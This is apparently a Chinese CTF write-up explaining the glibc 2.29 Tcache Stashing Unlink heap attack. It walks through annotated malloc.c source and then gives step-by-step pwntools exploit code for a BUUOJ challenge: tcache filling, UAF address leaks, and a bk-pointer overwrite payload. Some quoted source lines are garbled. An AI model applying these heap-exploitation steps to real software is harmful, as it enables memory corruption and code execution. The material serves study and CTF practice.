# Tcache Stashing Unlink Attack利用思路
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 写在前面
`Tcache Stashing Unlink Attack`这个攻击名词是我第一次见到的，因此写一篇文章以记录思路。
2020/03/13 更新：`Tcache Stashing Unlink
Attack`有了更深的利用方式，从本来的任意地址写一个指定值或可扩大到任意地址分配chunk进而做到任意地址读写。
## 0x01 前置知识
### House of Lore Attack
`Tcache Stashing Unlink Attack`也是利用了`Smallbin`的相关分配机制进行的攻击，因此此处先对`House of
Lore`这一攻击技术做一个简要的介绍。
#### 攻击目标
分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）
#### 攻击前提
能控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。
#### 攻击原理
##### 漏洞源码（Glibc2.29 malloc.c line3639）
⚠️：代码中的英文注释为源代码自带，中文注释为分析，Tcache部分不做分析。
      /*
        If a small request, check regular bin.  Since these "smallbins"
        hold one size each, no searching within bins is necessary.
        (For a large request, we need to wait until unsorted chunks are
        processed to find best fit. But for small ones, fits are exact
        anyway, so we can check now, which is faster.)
    */
    if (in_smallbin_range (nb))
    {
        idx = smallbin_index (nb);
        // 获取 small bin 的索引
        bin = bin_at (av, idx);
        // 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk
        // 若结果 victim = bin ，那说明该 bin 为空。
        if ( ( victim = last (bin) ) != bin )
        {
            // 获取 small bin 中倒数第二个 chunk 。
            bck = victim->bk;
            // 检查 bck->fd 是不是 victim，防止伪造
            if ( __glibc_unlikely( bck->fd != victim ) )
                malloc_printerr ("malloc(): smallbin double linked list corrupted");
            // 设置 victim 对应的 inuse 位
            set_inuse_bit_at_offset (victim, nb);
            // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
            bin->bk = bck;
            bck->fd = bin;
            // 如果不是 main_arena，设置对应的标志
            if (av != &main_arena)
                set_non_main_arena (victim);
            //执行更为细致的检查
            check_malloced_chunk (av, victim, nb);
    #if USE_TCACHE //如果程序启用了Tcache
            /* While we're here, if we see other chunks of the same size,
            stash them in the tcache.  */
            size_t tc_idx = csize2tidx (nb);
            if (tcache && tc_idx counts[tc_idx] bk;
                        set_inuse_bit_at_offset (tc_victim, nb);
                        if (av != &main_arena)
                            set_non_main_arena (tc_victim);
                        bin->bk = bck;
                        bck->fd = bin;
                        tcache_put (tc_victim, tc_idx);
                    }
                }
            }
    #endif
            // 将申请到的 chunk 转化为对应的 mem 状态
            void *p = chunk2mem (victim);
            // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
            alloc_perturb (p, bytes);
            return p;
        }
    }
可以看到，在Glibc2.29中也没有对`Small Bin`的`malloc`做更多的保护~
##### 漏洞分析
    // 获取 small bin 中倒数第二个 chunk 。
    bck = victim->bk;
    // 检查 bck->fd 是不是 victim，防止伪造
    if ( __glibc_unlikely( bck->fd != victim ) )
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
    // 设置 victim 对应的 inuse 位
    set_inuse_bit_at_offset (victim, nb);
    // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
    bin->bk = bck;
    bck->fd = bin;
也就是说，如果此处我们能够控制 small bin 的最后一个 chunk 的 bk 为我们想要写入的内存地址，并且保证`__glibc_unlikely(
bck->fd != victim )`检查通过就可以在small bin中加入我们想加入的Chunk，进而在内存的任意地址分配一个Chunk！
### Tcache Stashing Unlink Attack
#### 攻击目标
  1. 向任意指定位置写入指定值。
  2. 向任意地址分配一个Chunk。
#### 攻击前提
  1. 能控制 Small Bin Chunk 的 bk 指针。
  2. 程序可以越过Tache取Chunk。(使用calloc即可做到)
  3. 程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。
#### 攻击原理
我们首先分析`House of Lore Attack`中所忽视的Tcache相关代码。
    #if USE_TCACHE //如果程序启用了Tcache
            /* While we're here, if we see other chunks of the same size,
            stash them in the tcache.  */
            //遍历整个smallbin，获取相同size的free chunk
            size_t tc_idx = csize2tidx (nb);
            if (tcache && tc_idx counts[tc_idx] bk;
                        //设置标志位
                        set_inuse_bit_at_offset (tc_victim, nb);
                        // 如果不是 main_arena，设置对应的标志
                        if (av != &main_arena)
                            set_non_main_arena (tc_victim);
                        //取出最后一个Chunk
                        bin->bk = bck;
                        bck->fd = bin;
                        //将其放入到Tcache中
                        tcache_put (tc_victim, tc_idx);
                    }
                }
            }
    #endif
此处我们发现了一个很关键的情况！我们在此处没有经过`House of Lore`中必须经过的检查：
    // 检查 bck->fd 是不是 victim，防止伪造
    if ( __glibc_unlikely( bck->fd != victim ) )
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
但是此处又有了矛盾的地方！
**首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）**
然后，我们如果要在这里启动攻击，那么要求`SmallBin`中至少有两个Chunk(否则无法进入While中的if语句块)，
**同时要求Tcache处于非空状态。**
那样就产生了矛盾，导致这个漏洞看似无法利用。
但是`calloc`函数有一个很有趣的特性，它不会从`Tcache`拿`Chunk`，因此可以越过第一条矛盾“不能越过`Tcache`从`SmallBin`中取出`Chunk`”。
然后是`Unsorted Bin`的 **`last remainder`** 基址，当申请的Chunk大于`Unsorted
Bin`中Chunk的大小且其为`Unsorted Bin`中的唯一`Chunk`时，该`Chunk`不会进入`Tcache`。
同时，我们来分析`tcache_put`函数
    static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx)
    {
      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
      assert (tc_idx key = tcache;
    ​
      e->next = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e;
      ++(tcache->counts[tc_idx]);
    }
可以发现，`tcache_put`函数没有做任何的安全检查。
那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。
## 0x02 以BUUOJ-2020 新春红包题-3为例
### 题目分析
除了Canary保护外，保护全部开启。
题目很明显， **在free后没有将指针置零，存在Use-After-Free漏洞** ，并且因为程序开启了Edit功能和Show功能，导致漏洞十分严重。
题目在分配`Chunk`时规定了大小，因此限制了我们对于`Large Bin Attack`的使用。
另外题目的分配函数使用了`calloc()`，`calloc()`会在申请`Chunk`后对其内部进行清零操作，并且`calloc()`不会从`Tcache
Bin`中取出堆块，那么我们直接将`Tcache Bin`填满就可以进行正常利用了。
程序在最后预留了后门函数，以供我们执行ROP链。
但是后门的启用需要满足三个条件
而`Back_door_heck`变量是一个大小为0x1000的Chunk。
### Tcache Bin的填充
首先，需要循环释放7个Chunk到Tcache Bin区域以填满Tcache以防止其干扰我们后续的利用。
    for i in range(7):
        creat(sh,15,4,'Chunk_15')
        delete(sh,15)
**同时为了之后我们使用`Tcache Stashing Unlink Attack`，我们需要先向0x100大小的Tcache
Bin释放6个Chunk，这样，在将我们伪造的Fake_chunk放入Tcache Bin区域时，Tcache
Bin区域将会填满，程序不会继续通过我们伪造的bk指针向后继续遍历。**
    for i in range(6):
        creat(sh,14,2,'Chunk_14')
        delete(sh,14)
### 泄露Heap地址及Libc地址
因为UAF漏洞的存在，我们只需要打印已经释放过的Tcache即可计算出Heap区域的首地址。
    show(sh,15)
    last_chunk_addr = get_address(sh,'We get last chunk address is ','','\x0A')
    heap_addr = last_chunk_addr - 0x26C0
    log.success('We get heap address is ' + str(hex(heap_addr)))
接下来继续分配一个`0x300`大小的Chunk，释放后它将进入`Unsorted Bin`,此时打印它的内容，将泄漏`Libc`基址。
⚠️：为防止`Top Chunk`合并，需要在最后额外申请一个Chunk。
    creat(sh,1,4,'Chunk_1')
    creat(sh,13,3,'Chunk_13')
    delete(sh,1)
    show(sh,1)
    libc_base = get_address(sh,'We leak main arena address is ','','\x0A') - 0x1E4CA0
    log.success('We get libc base address is ' + str(hex(libc_base)))
### 向Small Bin中加入两个Chunk
此时在`Unsorted
Bin`中已经有一个0x410大小的Chunk了，现在我们申请两个0x300大小的Chunk，程序会将0x100大小的Chunk放入`Small
Bin`中。
    creat(sh,13,3,'Chunk_13')
    creat(sh,13,3,'Chunk_13')
然后我们再次申请一个0x400的Chunk，释放，再申请一个0x300的Chunk，在Small Bin中再次加入一个大小为0x100的`Chunk`。
⚠️：为防止`Top Chunk`合并，需要在最后额外申请一个Chunk。
    creat(sh,2,4,'Chunk_2')
    creat(sh,13,4,'Chunk_13')
    delete(sh,2)
    creat(sh,13,3,'Chunk_13')
    creat(sh,13,3,'Chunk_13')
###
###  执行 Tcache Stashing Unlink Attack
现在SmallBin中的情况为：
    Small Bin: Chunk2 -> Chunk1
那么我们接下来若申请一个大小为`0xF0`的`Chunk`，程序仅会检查`Chunk2`的`fd`指针是否指向`Chunk1`。
在取出Chunk1后， **因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中！**
我们若此时篡改`Chunk2`的`bk`指针指向`heap_addr+0x250+0x10+0x800-0x10`，程序就会在`heap_addr+0x250+0x10+0x800`的位置写入`main_arena`的地址，进而可以让我们进入后门函数。
    payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x31E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
    edit(sh,2,payload)